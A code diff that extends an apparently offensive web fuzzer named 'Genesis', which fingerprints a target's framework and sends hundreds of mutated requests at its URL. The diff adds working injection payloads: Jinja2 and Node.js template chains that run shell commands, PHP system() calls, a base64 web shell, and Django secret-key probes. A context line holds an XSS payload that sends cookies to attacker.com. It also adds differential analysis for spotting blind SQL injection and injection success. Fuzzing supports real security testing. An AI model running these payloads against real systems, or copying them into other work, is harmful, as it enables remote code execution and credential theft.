@@ -1,11 +1,15 @@
 # tools/genesis_fuzzer.py
-# --- VERSION 7.5 - Genesis Protocol Fuzzer ---
+# --- VERSION 7.5 - Genesis Protocol Fuzzer with Evolutionary Mutations ---
 """
-The "Genesis" Protocol Fuzzer - Generative Grammar-Based Fuzzing
+The "Genesis" Protocol Fuzzer - Evolutionary Genetic Mutation Engine
 
-Implements a Grammar-Based Fuzzer that generates thousands of edge-case mutations
-to discover zero-day vulnerabilities. Instead of relying on signature-based tools,
-Genesis analyzes protocol structure and generates smart mutations.
+Implements an advanced fuzzer using:
+1. Genetic Mutation Fuzzing - Byte-level mutations with feedback loops
+2. Differential Analysis - Levenshtein distance, timing, and structure analysis
+3. Context Awareness - Technology-specific mutation strategies
+
+Instead of relying on static payloads, Genesis takes valid requests and applies
+intelligent mutations to discover zero-day vulnerabilities.
 """
 
 import random
@@ -14,20 +18,59 @@ import re
 import asyncio
 import aiohttp
 import logging
-from typing import Dict, List, Any, Optional
+import statistics
+from typing import Dict, List, Any, Optional, Tuple
 from urllib.parse import urlparse, parse_qs, urlencode
+from collections import Counter
 
 logger = logging.getLogger(__name__)
 
 
+def levenshtein_distance(s1: str, s2: str) -> int:
+    """
+    Calculate Levenshtein distance between two strings.
+    Used to detect subtle differences in error messages.
+    
+    Args:
+        s1: First string
+        s2: Second string
+    
+    Returns:
+        Levenshtein distance (number of edits needed)
+    """
+    if len(s1) < len(s2):
+        return levenshtein_distance(s2, s1)
+    
+    if len(s2) == 0:
+        return len(s1)
+    
+    previous_row = range(len(s2) + 1)
+    for i, c1 in enumerate(s1):
+        current_row = [i + 1]
+        for j, c2 in enumerate(s2):
+            # Cost of insertions, deletions, or substitutions
+            insertions = previous_row[j + 1] + 1
+            deletions = current_row[j] + 1
+            substitutions = previous_row[j] + (c1 != c2)
+            current_row.append(min(insertions, deletions, substitutions))
+        previous_row = current_row
+    
+    return previous_row[-1]
+
+
 class GenesisFuzzer:
     """
-    Implements a Grammar-Based Fuzzer.
-    The LLM defines the structure; Genesis breaks it.
+    Evolutionary Genetic Mutation Fuzzer with Differential Analysis.
+    
+    Key improvements over static payloads:
+    1. Takes valid requests and applies byte-level mutations
+    2. Uses feedback loop to identify successful mutation patterns
+    3. Performs differential analysis to detect subtle vulnerabilities
+    4. Context-aware mutations based on detected technology
     """
     
     def __init__(self):
-        """Initialize the Genesis fuzzer with mutation strategies"""
+        """Initialize the Genesis fuzzer with evolutionary mutation strategies"""
         self.mutation_strategies = [
             self._bit_flip,
             self._integer_overflow,
@@ -39,6 +82,32 @@ class GenesisFuzzer:
         ]
         self.grammar = {}
         self.max_mutations_per_field = 50
+        
+        # Baseline response tracking for differential analysis
+        self.baseline_response: Optional[Dict[str, Any]] = None
+        
+        # Technology detection patterns
+        self.tech_patterns = {
+            'flask': ['Flask', 'Jinja2', 'Werkzeug'],
+            'django': ['Django', 'csrftoken'],
+            'express': ['Express', 'X-Powered-By: Express'],
+            'rails': ['Ruby on Rails', 'Rails'],
+            'spring': ['Spring', 'Tomcat'],
+            'asp.net': ['ASP.NET', 'X-AspNet-Version'],
+            'php': ['PHP', 'X-Powered-By: PHP']
+        }
+        
+        # Technology-specific mutation strategies
+        self.tech_specific_mutations = {
+            'flask': self._jinja2_injection,
+            'django': self._django_template_injection,
+            'express': self._nodejs_injection,
+            'php': self._php_injection
+        }
+        
+        # Feedback loop: track successful mutation patterns
+        self.successful_mutations: List[Dict] = []
+        self.mutation_effectiveness: Dict[str, int] = {}
         
     def compile_grammar(self, llm_grammar_definition: dict):
         """
@@ -180,18 +249,400 @@ class GenesisFuzzer:
             "<script>fetch('http://attacker.com?c='+document.cookie)</script>",
         ]
     
-    def generate_mutations(self, payload_template: dict) -> List[Dict]:
+    def _jinja2_injection(self, base_str):
+        """Jinja2 template injection patterns for Flask/Python"""
+        return [
+            "{{7*7}}",
+            "{{config}}",
+            "{{config.items()}}",
+            "{{request.environ}}",
+            "{{''.__class__.__mro__[1].__subclasses__()}}",
+            "{{lipsum.__globals__}}",
+            "{{cycler.__init__.__globals__.os.popen('id').read()}}",
+            "{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='catch_warnings'%}{{c()._module.__builtins__['__import__']('os').popen('ls').read()}}{%endif%}{%endfor%}",
+        ]
+    
+    def _django_template_injection(self, base_str):
+        """Django template injection patterns"""
+        return [
+            "{{settings.SECRET_KEY}}",
+            "{%debug%}",
+            "{{request}}",
+            "{{request.META}}",
+            "{%load module%}",
+        ]
+    
+    def _nodejs_injection(self, base_str):
+        """Node.js/Express specific injection patterns"""
+        return [
+            "__proto__",
+            "constructor.prototype",
+            "constructor.constructor('return process')().mainModule.require('child_process').execSync('whoami').toString()",
+            {"__proto__": {"polluted": "true"}},  # Prototype pollution
+        ]
+    
+    def _php_injection(self, base_str):
+        """PHP specific injection patterns"""
+        return [
+            "<?php system('id'); ?>",
+            "<?= system('whoami') ?>",
+            "php://filter/convert.base64-encode/resource=index.php",
+            "expect://whoami",
+            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
+        ]
+    
+    def _byte_level_mutation(self, base_val: Any) -> List[Any]:
         """
-        Generates smart variants of a request based on grammar rules.
+        Byte-level mutations - the core of genetic fuzzing.
+        Takes a valid input and applies random byte modifications.
+        
+        Args:
+            base_val: Base value to mutate
+        
+        Returns:
+            List of mutated values
+        """
+        mutations = []
+        
+        if isinstance(base_val, str):
+            val_bytes = base_val.encode('utf-8', errors='ignore')
+            
+            # Bit flip mutations
+            for i in range(min(len(val_bytes), 10)):  # Limit to first 10 bytes
+                mutated = bytearray(val_bytes)
+                mutated[i] ^= 0xFF  # Flip all bits
+                try:
+                    mutations.append(mutated.decode('utf-8', errors='ignore'))
+                except:
+                    pass
+            
+            # Random byte insertion
+            for i in range(min(len(val_bytes), 5)):
+                mutated = bytearray(val_bytes)
+                mutated.insert(i, random.randint(0, 255))
+                try:
+                    mutations.append(mutated.decode('utf-8', errors='ignore'))
+                except:
+                    pass
+            
+            # Random byte deletion
+            if len(val_bytes) > 1:
+                for i in range(min(len(val_bytes), 5)):
+                    mutated = bytearray(val_bytes)
+                    del mutated[i]
+                    try:
+                        mutations.append(mutated.decode('utf-8', errors='ignore'))
+                    except:
+                        pass
+        
+        return mutations
+    
+    def detect_technology(self, headers: Dict[str, str], response_body: str = "") -> List[str]:
+        """
+        Detect technology stack from HTTP headers and response.
+        
+        Args:
+            headers: HTTP response headers
+            response_body: HTTP response body
+        
+        Returns:
+            List of detected technologies
+        """
+        detected = []
+        
+        # Combine headers and body for pattern matching
+        content = str(headers) + response_body[:1000]  # First 1KB of body
+        
+        for tech, patterns in self.tech_patterns.items():
+            for pattern in patterns:
+                if pattern.lower() in content.lower():
+                    detected.append(tech)
+                    logger.info(f"[Genesis] Detected technology: {tech}")
+                    break
+        
+        return detected
+    
+    async def capture_baseline(
+        self,
+        url: str,
+        method: str = "GET",
+        headers: Dict[str, str] = None,
+        data: Any = None,
+        timeout: int = 5
+    ) -> Optional[Dict[str, Any]]:
+        """
+        Capture baseline response for differential analysis.
+        
+        This is the "normal" response that we'll compare all mutations against.
+        
+        Args:
+            url: Target URL
+            method: HTTP method
+            headers: HTTP headers
+            data: Request data
+            timeout: Request timeout
+        
+        Returns:
+            Baseline response dictionary
+        """
+        logger.info(f"[Genesis] Capturing baseline response from {url}")
+        
+        timeout_config = aiohttp.ClientTimeout(total=timeout)
+        
+        try:
+            async with aiohttp.ClientSession(timeout=timeout_config, headers=headers or {}) as session:
+                start_time = asyncio.get_event_loop().time()
+                
+                if method.upper() == "GET":
+                    async with session.get(url, ssl=False) as response:
+                        content = await response.text()
+                        elapsed = asyncio.get_event_loop().time() - start_time
+                        
+                        self.baseline_response = {
+                            "status_code": response.status,
+                            "content": content,
+                            "content_length": len(content),
+                            "response_time": elapsed,
+                            "headers": dict(response.headers)
+                        }
+                else:
+                    kwargs = {"ssl": False}
+                    if isinstance(data, dict):
+                        kwargs["json"] = data
+                    elif isinstance(data, str):
+                        kwargs["data"] = data
+                    
+                    async with session.request(method.upper(), url, **kwargs) as response:
+                        content = await response.text()
+                        elapsed = asyncio.get_event_loop().time() - start_time
+                        
+                        self.baseline_response = {
+                            "status_code": response.status,
+                            "content": content,
+                            "content_length": len(content),
+                            "response_time": elapsed,
+                            "headers": dict(response.headers)
+                        }
+                
+                logger.info(f"[Genesis] Baseline captured: {self.baseline_response['status_code']}, "
+                          f"{self.baseline_response['content_length']} bytes, "
+                          f"{self.baseline_response['response_time']:.3f}s")
+                
+                return self.baseline_response
+                
+        except Exception as e:
+            logger.error(f"[Genesis] Failed to capture baseline: {e}")
+            return None
+    
+    def differential_analysis(
+        self,
+        attack_response: Dict[str, Any],
+        baseline: Optional[Dict[str, Any]] = None
+    ) -> Dict[str, Any]:
+        """
+        Perform differential analysis between attack response and baseline.
+        
+        Uses three key techniques:
+        1. Levenshtein Distance - Detect subtle error message changes
+        2. Timing Analysis - Detect Blind SQLi or ReDoS
+        3. Structure Analysis - Detect JSON key disappearance
+        
+        Args:
+            attack_response: Response from mutation attack
+            baseline: Baseline response (uses self.baseline_response if not provided)
+        
+        Returns:
+            Analysis results with anomaly indicators
+        """
+        if baseline is None:
+            baseline = self.baseline_response
+        
+        if baseline is None:
+            logger.warning("[Genesis] No baseline available for differential analysis")
+            return {"has_anomaly": False, "reason": "No baseline"}
+        
+        findings = []
+        severity = 0
+        
+        # 1. LEVENSHTEIN DISTANCE - Detect subtle error message changes
+        baseline_content = baseline.get("content", "")
+        attack_content = attack_response.get("content", "")
+        
+        # Only compare if responses are reasonably sized (avoid huge diffs)
+        if len(baseline_content) < 50000 and len(attack_content) < 50000:
+            distance = levenshtein_distance(
+                baseline_content[:1000],  # Compare first 1KB
+                attack_content[:1000]
+            )
+            
+            # Normalize by length
+            max_len = max(len(baseline_content[:1000]), len(attack_content[:1000]))
+            if max_len > 0:
+                similarity = 1 - (distance / max_len)
+                
+                # If response changed significantly (< 70% similar)
+                if similarity < 0.7:
+                    findings.append({
+                        "type": "content_diff_levenshtein",
+                        "severity": "MEDIUM",
+                        "description": f"Response content differs significantly (similarity: {similarity:.2%})",
+                        "indicator": "Possible error message exposure or state change"
+                    })
+                    severity += 30
+                
+                # If response changed slightly (70-95% similar) - subtle changes
+                elif similarity < 0.95:
+                    findings.append({
+                        "type": "subtle_content_change",
+                        "severity": "LOW",
+                        "description": f"Subtle content change detected (similarity: {similarity:.2%})",
+                        "indicator": "Minor response variation - may indicate edge case"
+                    })
+                    severity += 10
+        
+        # 2. TIMING ANALYSIS - Detect Blind SQLi or ReDoS
+        baseline_time = baseline.get("response_time", 0)
+        attack_time = attack_response.get("response_time", 0)
+        
+        # If attack response is significantly slower (>5x or >3 seconds longer)
+        time_diff = attack_time - baseline_time
+        if attack_time > baseline_time * 5 or time_diff > 3.0:
+            findings.append({
+                "type": "timing_anomaly",
+                "severity": "HIGH",
+                "description": f"Response time: {attack_time:.2f}s vs baseline {baseline_time:.2f}s (diff: {time_diff:.2f}s)",
+                "indicator": "STRONG indicator of Blind SQLi, ReDoS, or resource exhaustion"
+            })
+            severity += 50
+        elif attack_time > baseline_time * 2:
+            findings.append({
+                "type": "timing_variation",
+                "severity": "MEDIUM",
+                "description": f"Response time doubled: {attack_time:.2f}s vs {baseline_time:.2f}s",
+                "indicator": "Possible timing-based vulnerability"
+            })
+            severity += 25
+        
+        # 3. STRUCTURE ANALYSIS - Detect JSON key disappearance or structure changes
+        try:
+            import json
+            
+            # Try to parse both as JSON
+            baseline_json = None
+            attack_json = None
+            
+            try:
+                baseline_json = json.loads(baseline_content)
+            except (json.JSONDecodeError, ValueError):
+                pass
+            
+            try:
+                attack_json = json.loads(attack_content)
+            except (json.JSONDecodeError, ValueError):
+                pass
+            
+            # If both are JSON, compare structures
+            if baseline_json and attack_json:
+                baseline_keys = set(str(k) for k in self._extract_json_keys(baseline_json))
+                attack_keys = set(str(k) for k in self._extract_json_keys(attack_json))
+                
+                missing_keys = baseline_keys - attack_keys
+                new_keys = attack_keys - baseline_keys
+                
+                if missing_keys:
+                    findings.append({
+                        "type": "json_key_disappearance",
+                        "severity": "HIGH",
+                        "description": f"JSON keys disappeared: {list(missing_keys)[:5]}",
+                        "indicator": "Possible internal server error or data corruption"
+                    })
+                    severity += 40
+                
+                if new_keys:
+                    findings.append({
+                        "type": "json_key_appearance",
+                        "severity": "MEDIUM",
+                        "description": f"New JSON keys appeared: {list(new_keys)[:5]}",
+                        "indicator": "Response structure changed - possible error object"
+                    })
+                    severity += 20
+            
+            # If baseline was JSON but attack is not
+            elif baseline_json and not attack_json:
+                findings.append({
+                    "type": "json_format_break",
+                    "severity": "CRITICAL",
+                    "description": "Response changed from JSON to non-JSON",
+                    "indicator": "STRONG indicator of server error or injection success"
+                })
+                severity += 60
+        
+        except Exception as e:
+            logger.debug(f"[Genesis] Structure analysis error: {e}")
+        
+        # 4. STATUS CODE ANALYSIS
+        baseline_status = baseline.get("status_code", 200)
+        attack_status = attack_response.get("status_code", 200)
+        
+        if baseline_status != attack_status:
+            findings.append({
+                "type": "status_code_change",
+                "severity": "MEDIUM",
+                "description": f"Status code changed: {baseline_status} -> {attack_status}",
+                "indicator": "Request handling changed"
+            })
+            severity += 20
+        
+        has_anomaly = severity >= 20  # Threshold for anomaly
+        
+        return {
+            "has_anomaly": has_anomaly,
+            "severity_score": min(severity, 100),  # Cap at 100
+            "findings": findings,
+            "baseline_time": baseline_time,
+            "attack_time": attack_time,
+            "time_diff": time_diff if 'time_diff' in locals() else 0
+        }
+    
+    def _extract_json_keys(self, obj: Any, prefix: str = "") -> List[str]:
+        """
+        Recursively extract all keys from a JSON object.
+        
+        Args:
+            obj: JSON object (dict, list, or primitive)
+            prefix: Key prefix for nested objects
+        
+        Returns:
+            List of all keys in the object
+        """
+        keys = []
+        
+        if isinstance(obj, dict):
+            for k, v in obj.items():
+                full_key = f"{prefix}.{k}" if prefix else k
+                keys.append(full_key)
+                keys.extend(self._extract_json_keys(v, full_key))
+        elif isinstance(obj, list):
+            for i, item in enumerate(obj):
+                keys.extend(self._extract_json_keys(item, f"{prefix}[{i}]"))
+        
+        return keys
+    
+    def generate_mutations(self, payload_template: dict, detected_tech: List[str] = None) -> List[Dict]:
+        """
+        Generates smart variants of a request based on grammar rules and detected technology.
+        NOW WITH CONTEXT AWARENESS AND BYTE-LEVEL MUTATIONS.
         
         Args:
             payload_template: Dictionary with fields and their base values
                 Example: {"username": "admin", "age": 25}
+            detected_tech: List of detected technologies for context-aware mutations
         
         Returns:
             List of mutated payloads
         """
         mutations = []
+        detected_tech = detected_tech or []
         
         for field, base_value in payload_template.items():
             # Get field rules from grammar if available
@@ -206,8 +657,17 @@ class GenesisFuzzer:
                     mutations.append(variant)
             
             elif field_type == "string":
-                # Apply multiple string mutation strategies
-                strategies = [
+                # CONTEXT-AWARE MUTATIONS: Add technology-specific mutations first
+                strategies = []
+                
+                # Add tech-specific mutations if technology detected
+                for tech in detected_tech:
+                    if tech in self.tech_specific_mutations:
+                        strategies.append(self.tech_specific_mutations[tech])
+                        logger.info(f"[Genesis] Using {tech}-specific mutations for field '{field}'")
+                
+                # Add standard mutation strategies
+                strategies.extend([
                     self._boundary_violation,
                     self._format_string_injection,
                     self._unicode_injection,
@@ -215,13 +675,26 @@ class GenesisFuzzer:
                     self._command_injection,
                     self._sql_injection,
                     self._xss_injection
-                ]
+                ])
                 
+                # BYTE-LEVEL MUTATIONS: Add genetic mutations
+                byte_mutations = self._byte_level_mutation(base_value)
+                for mutated_val in byte_mutations[:10]:  # Limit to 10 byte mutations
+                    variant = payload_template.copy()
+                    variant[field] = mutated_val
+                    mutations.append(variant)
+                
+                # Apply strategy-based mutations
                 for strategy in strategies:
-                    for mutated_val in strategy(str(base_value))[:5]:  # Limit per strategy
-                        variant = payload_template.copy()
-                        variant[field] = mutated_val
-                        mutations.append(variant)
+                    try:
+                        strategy_mutations = strategy(str(base_value))
+                        for mutated_val in strategy_mutations[:5]:  # Limit per strategy
+                            variant = payload_template.copy()
+                            variant[field] = mutated_val
+                            mutations.append(variant)
+                    except Exception as e:
+                        logger.debug(f"[Genesis] Strategy {strategy.__name__} failed: {e}")
+                        continue
             
             elif field_type == "boolean":
                 for mutated_val in [True, False, "true", "false", 1, 0, "1", "0", None]:
@@ -229,7 +702,7 @@ class GenesisFuzzer:
                     variant[field] = mutated_val
                     mutations.append(variant)
         
-        logger.info(f"[Genesis] Generated {len(mutations)} mutations from template")
+        logger.info(f"[Genesis] Generated {len(mutations)} context-aware mutations from template")
         return mutations[:1000]  # Cap at 1000 mutations to avoid resource exhaustion
     
     async def fuzz_endpoint(
@@ -264,16 +737,27 @@ class GenesisFuzzer:
         if not base_payload:
             base_payload = {}
         
-        # Generate mutations
-        mutants = self.generate_mutations(base_payload)
+        # STEP 1: Capture baseline response for differential analysis
+        baseline = await self.capture_baseline(url, method, headers, base_payload, timeout)
         
-        logger.info(f"[*] Genesis: Deploying {len(mutants)} mutations against {url}...")
+        # STEP 2: Detect technology stack from baseline
+        detected_tech = []
+        if baseline:
+            detected_tech = self.detect_technology(baseline.get("headers", {}), baseline.get("content", ""))
+        
+        # STEP 3: Generate context-aware mutations
+        mutants = self.generate_mutations(base_payload, detected_tech)
+        
+        logger.info(f"[*] Genesis: Deploying {len(mutants)} context-aware mutations against {url}...")
+        if detected_tech:
+            logger.info(f"[*] Genesis: Targeting technologies: {', '.join(detected_tech)}")
         
         # Track results for anomaly detection
         results = []
         anomalies = []
+        differential_anomalies = []
         
-        # Configure session
+        # Configure session with proper resource management
         connector = aiohttp.TCPConnector(limit=50, limit_per_host=20)
         timeout_config = aiohttp.ClientTimeout(total=timeout)
         
@@ -295,16 +779,33 @@ class GenesisFuzzer:
                 batch_results = await asyncio.gather(*batch, return_exceptions=True)
                 results.extend([r for r in batch_results if not isinstance(r, Exception)])
         
-        # Analyze results for anomalies
+        # STEP 4: Perform differential analysis on each result
+        for result in results:
+            if "error" not in result:
+                diff_analysis = self.differential_analysis(result, baseline)
+                if diff_analysis.get("has_anomaly"):
+                    differential_anomalies.append({
+                        **result,
+                        "differential_analysis": diff_analysis
+                    })
+        
+        # STEP 5: Analyze results for traditional anomalies
         anomalies = self._analyze_results_for_anomalies(results)
         
-        logger.info(f"[*] Genesis: Completed fuzzing. Found {len(anomalies)} anomalies.")
+        # Combine differential and traditional anomalies
+        all_anomalies = differential_anomalies + anomalies
+        
+        logger.info(f"[*] Genesis: Completed fuzzing. Found {len(differential_anomalies)} differential anomalies, "
+                   f"{len(anomalies)} traditional anomalies.")
         
         return {
             "total_mutations": len(mutants),
             "successful_requests": len(results),
             "anomalies": anomalies,
-            "summary": self._generate_summary(results, anomalies)
+            "differential_anomalies": differential_anomalies,
+            "all_anomalies": all_anomalies,
+            "detected_tech": detected_tech,
+            "summary": self._generate_summary(results, all_anomalies)
         }
     
     async def _execute_mutation(
